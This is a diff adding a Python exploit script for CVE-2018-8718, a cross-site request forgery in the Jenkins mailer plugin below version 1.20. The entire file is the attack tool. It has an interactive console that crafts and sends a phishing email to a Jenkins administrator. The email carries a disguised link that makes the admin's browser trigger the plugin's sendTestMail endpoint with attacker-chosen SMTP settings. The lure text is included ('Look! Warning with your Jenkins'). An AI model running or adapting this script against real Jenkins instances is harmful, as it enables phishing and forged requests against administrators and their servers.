@@ -1,0 +1,219 @@
+# Exploit Title : Jenkins mailer plugin < 1.20 - Cross-Site Request Forgery
+# Date : 2018-06-05
+# Exploit Author : Kl3_GMjq6
+# Vendor Homepage : https://jenkins.io/
+# Software Link : [https://updates.jenkins.io/download/plugins/mailer/1.20/mailer.hpi]
+# Version: [Below Version 1.20 (1.1 ~ 1.20) ]
+# Ref: https://jenkins.io/security/advisory/2018-03-26/#SECURITY-774
+# Tested on : Linux , Windows
+# CVE : CVE-2018-8718
+
+import email.message
+import smtplib
+import getpass
+
+payload_list = ['url','subject','cover_message','sender','reciver','test_email','smtp_server','l_id','l_pw']
+table = {}
+for i in payload_list :
+    table.update({i:''})
+    
+def send_mail() :
+    msg = email.message.Message()
+    msg['Subject'] = table['subject']
+    msg['From'] = table['sender']
+    msg['To'] = table['reciver']
+    msg.add_header('Content-Type','text/html')
+    msg.set_payload('<a href="'+table['url']+'\
+/descriptorByName/hudson.tasks.Mailer/sendTestMail?\
+charset=UTF-8&sendTestMailTo='+table['test_email']+'&adminAddress='+table['reciver']+'\
+&smtpPort=465&smtpServer='+table['smtp_server']+'&smtpAuthPasswordSecret='+table['l_pw']+'\
+&useSMTPAuth=true&useSsl=true&smtpAuthUserName='+table['l_id']+'">\
+'+table['cover_message']+'</a>')
+    s = smtplib.SMTP(table['smtp_server'])
+    s.starttls()
+    s.login(table['l_id'],
+            table['l_pw'])
+    s.sendmail(msg['From'], [msg['To']], msg.as_string())
+
+def url_set() :
+    url = str(input("Jenkins Server's URL(ex : http://vuln.jenkins.com) : "))
+    if len(url) <= 0 :
+        print ("    Can't Be Null!")
+        url_set()
+    elif url[0:4] != "http" :
+        print ("    URL must start with 'http://' ")
+        url_set()
+    else : table['url'] = url
+
+def subject_set() :
+    subject = str(input ("SUBJECT [Default : Look! Warning with your Jenkins] : "))
+    if len(subject) <= 0 :
+        subject = "Look! Waning with your Jenkins"
+    table['subject'] = subject
+
+def cover_message() :
+    cover_message = str(input ("Cover Message [Default : Here is your Vulnable!] : "))
+    if len(cover_message) <= 0 :
+        cover_message = "Here is your Vulnable!"
+    table['cover_message'] = cover_message
+    
+def sender() :
+    sender = str(input ("Attacker E-mail(ex : attacker@abcd.com) : "))
+    if len(sender) <= 0 :
+        print ("    Can't Be Null!")
+        sender()
+    else : table['sender'] = sender
+
+def reciver() :
+    reciver = str(input ("Admin's E-mail(ex : admin@abcd.com) : "))
+    if len(reciver) <= 0 :
+        print ("    Can't Be Null!")
+        reciver()
+    else : table['reciver'] = reciver
+
+def test_email() :
+    test_email = str(input ("Tester E-mail(ex : tester@abcd.com) : "))
+    if len(test_email) <= 0 :
+        print ("    Can't Be Null!")
+        test_email()
+    table['test_email']  = test_email
+
+def smtp_server() :
+    smtp_server = str(input ("SMTP_Server [Default : smtp.gmail.com] : "))
+    if len(smtp_server) <= 0 :
+        smtp_server = "smtp.gmail.com"
+    table['smtp_server'] = smtp_server
+
+def l_id() :
+    l_id = str(input ("Your SMTP_Server ID  : "))
+    if len(l_id) <= 0 :
+        print ("    Can't Be Null!")
+        l_id()
+    table['l_id'] = l_id
+
+def l_pw() :
+    l_pw = str(getpass.getpass("Your SMTP_Server PW : "))
+    if len(l_pw) <= 0 :
+        print ("    Can't Be Null!")
+        l_pw()
+    table['l_pw'] = l_pw
+
+def set_all () :
+    url_set()
+    subject_set()
+    cover_message()
+    sender()
+    reciver()
+    test_email()
+    smtp_server()
+    l_id()
+    l_pw()
+    print ("Setting Complit! Use 'show' to check options")
+
+set_help = {
+    'all':"Set all payload",
+    'help':"Show set commend's help",
+    'url_set':"Set only 'url_set' payload",
+    'subject_set':"Set only 'url_set' payload",
+    'cover_message':"Set only 'cover_message' payload",
+    'sender':"Set only 'sender' payload",
+    'reciver':"Set only 'reciver' payload",
+    'test_email':"Set only 'test_email' payload",
+    'smtp_server':"Set only 'smtp_server' payload",
+    'l_id':"Set only 'l_id' payload",
+    'l_pw':"Set only 'l_pw' payload",
+    }
+
+def set_select (a) :
+    if a=="all" : set_all() 
+    elif a=="url_set" : url_set()
+    elif a=="subject_set" : subject_set()
+    elif a=="cover_message" : cover_message()
+    elif a=="sender" : sender()
+    elif a=="reciver" : reciver()
+    elif a=="test_email" : test_email()
+    elif a=="smtp_server" : smtp_server()
+    elif a=="l_id" : l_id()
+    elif a=="l_pw" : l_pw()
+    elif a=="help" :
+        for i in set_help :
+            print ("    -%-20s %-s" %(i,set_help[i]))
+    print ('')
+
+
+
+while True :
+    direct = str(input ("CVE-2018-8718 >> ")).lower()
+    
+    if direct == "help" :
+        print ("""\
+    %-10s Show this help menu.          
+    %-10s [-all / -help / -url_set / -subject_set / .... ]
+    %-10s Set the Payload
+    %-10s [-all] Show Current Setting.
+    %-10s Send CSRF use current setting.
+    """ %("help","set","","show","send"))
+        
+    elif direct[0:3] == "set" :
+        if ' -' not in direct :
+            if direct == "set" :
+                set_option = ["help"]
+            else :
+                print ("    Option error \n")
+        else :
+            set_option = direct.split(' -')[1:]
+        okay = 1
+
+        if len(set_option) == 1 :
+            if set_option[0] not in set_help :
+                print ("    Option error \n")
+            else :
+                set_select(set_option[0])
+        elif len(set_option) >= 2 :
+            for i in set_option :
+                if i in ['help', 'all'] :
+                    print ("     *Option [-help / -all] cannot be use with another options \n")
+                    okay = 0
+                    break
+            for i in set_option :
+                if i not in set_help :
+                    print ("    Option error \n")
+                    okay = 0
+                    break
+            if okay == 1 :
+                for i in set_option :
+                    set_select(i)
+                    
+    elif direct[:4] == "show" :
+        if " -" not in direct :
+
+            if direct == "show" :
+                for i in table :
+                    if i != "l_pw" :
+                        print ("    %-20s %s" %(i,table[i]))
+                print ("    If you want to see l_pw... add [-all] option")
+                print ("")
+            else :
+                print ("    Option error \n")
+        else :
+            show_option = direct.split(" -")[1:]
+            if (len(show_option) == 1 and show_option[0] == 'all') :
+                for i in table :
+                    print ("      %-20s %s" %(i,table[i]))
+                print ()
+            else :
+                print ("    Option error \n")
+        
+    elif direct == "send" :
+        print ("    Sending CSRF Mail.....")
+        try :
+            send_mail()
+            print ("    Succed!!\n")
+        except :
+            print ("    Fail....")
+            
+    elif direct == "exit" :
+        break
+    
+    else :
+        print ("    Usage : help\n")
